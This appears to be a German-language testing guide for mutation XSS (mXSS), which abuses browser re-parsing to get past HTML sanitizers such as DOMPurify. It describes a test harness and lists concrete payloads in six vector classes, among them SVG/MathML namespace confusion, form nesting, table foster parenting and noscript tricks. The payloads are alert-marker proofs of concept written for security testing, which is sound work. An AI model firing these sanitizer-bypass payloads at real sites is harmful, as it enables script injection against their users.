# Mutation-XSS (mXSS)

## Prinzip

Der Browser mutiert Markup beim Parsen und Serialisieren. Der Sanitizer sieht Eingabe A, der Browser baut daraus B. mXSS entsteht, wenn die Sanitizer-Ausgabe erneut geparst wird (innerHTML-Roundtrip, Serialisierung, Wiedereinfügung) und aus inertem Markup ein ausführbarer Kontext entsteht.

## Testmethode

Harness `assets/mxss-harness.js` im Seitenkontext ausführen:

```
__mxssStart()                                          // Starter-Vektorsatz
__mxssTest(__MXSS_STARTER)                             // ohne Sanitizer
__mxssTest(__MXSS_STARTER, (x) => DOMPurify.sanitize(x))  // mit Sanitizer
```

Das Harness zeigt pro Payload: sanitisierte Form, Ergebnis des ersten Parses, Ergebnis des zweiten Parses, und ob Mutation stattfand. `mutated: true` ist der Einstiegspunkt — den mutierten Output lesen und prüfen, ob ein ausführbarer Kontext entstanden ist. Mutation allein ist kein Finding; ausführbarer Kontext nach Re-Parse ist der Nachweis-Schritt, danach echte Ausführung mit Origin-Marker.

## Vektor-Klassen mit kanonischen Beispielen

`MARKER` = `alert('DX_XSS@'+location.origin)`.

1. **Namespace-Verwirrung (SVG/MathML ↔ HTML):**
   - `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=MARKER>`
   - `<svg></p><style><a id="</style><img src=x onerror=MARKER>">`
   - `<math><annotation-xml encoding="text/html"><img src=x onerror=MARKER></annotation-xml></math>`
2. **Form-Verschachtelung:**
   - `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=MARKER>`
   - `<form id=x></form><button form=x formaction="javascript:MARKER">x</button>` (form-Ownership)
3. **Table-Reflow (Foster Parenting):**
   - `<table><svg><style><a id="</style><img src=x onerror=MARKER>">`
   - `<table><style><img src=x onerror=MARKER></table>`
4. **Style-/Kommentar-Kontextwechsel:**
   - `<style><style/><img src=x onerror=MARKER>`
   - `<!--<img src=x onerror=MARKER>-->` in fremdem Namespace
5. **Attribut-Mutation:**
   - Attribute mit Entities, die beim Serialisieren zu echten Quotes werden und neue Attribute erzeugen: `<a href="&quot; onmouseover=MARKER x=&quot;">x</a>` — im Roundtrip prüfen.
6. **Scripting-Flag-Wechsel:**
   - `<noscript><p title="</noscript><img src=x onerror=MARKER>">` (parsen mit/ohne Scripting unterscheidet sich)

## Erfolgskriterium

Der Re-Parse erzeugt aus zuvor inertem Markup einen ausführbaren Kontext — beobachtet im Harness, nicht vermutet. Danach Payload zur echten Ausführung bringen (Origin-Marker, Screenshot). Dokumentiere pro getesteter Klasse: Vektor, Mutation ja/nein, was mutiert wurde.
